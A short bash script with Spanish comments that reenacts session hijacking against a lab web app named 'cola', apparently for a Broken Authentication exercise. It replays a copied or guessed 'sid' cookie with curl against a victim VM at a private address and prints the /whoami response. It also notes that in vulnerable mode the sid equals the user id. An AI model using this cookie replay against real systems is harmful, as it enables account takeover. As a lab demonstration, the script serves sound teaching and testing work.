#!/usr/bin/env bash
# Reenacta el robo de sesion contra la app "cola" (Broken Auth).
# Reutiliza una cookie 'sid' desde la maquina del atacante.
#
# Uso:
#   ./hijack.sh <sid>        # usa la cookie copiada de la victima
#   ./hijack.sh 1            # en modo vuln el sid es predecible (= id de usuario)
#
# -k: la VM victima usa un certificado autofirmado (laboratorio).
set -euo pipefail

VICTIM="${VICTIM:-https://192.168.56.10:8000}"
SID="${1:-1}"

echo "[*] Probando sesion sid=$SID contra $VICTIM"
curl -k -s -o /dev/null -w "HTTP %{http_code}\n" -b "sid=$SID" "$VICTIM/whoami"
echo "[*] Respuesta de /whoami:"
curl -k -s -b "sid=$SID" "$VICTIM/whoami"
echo
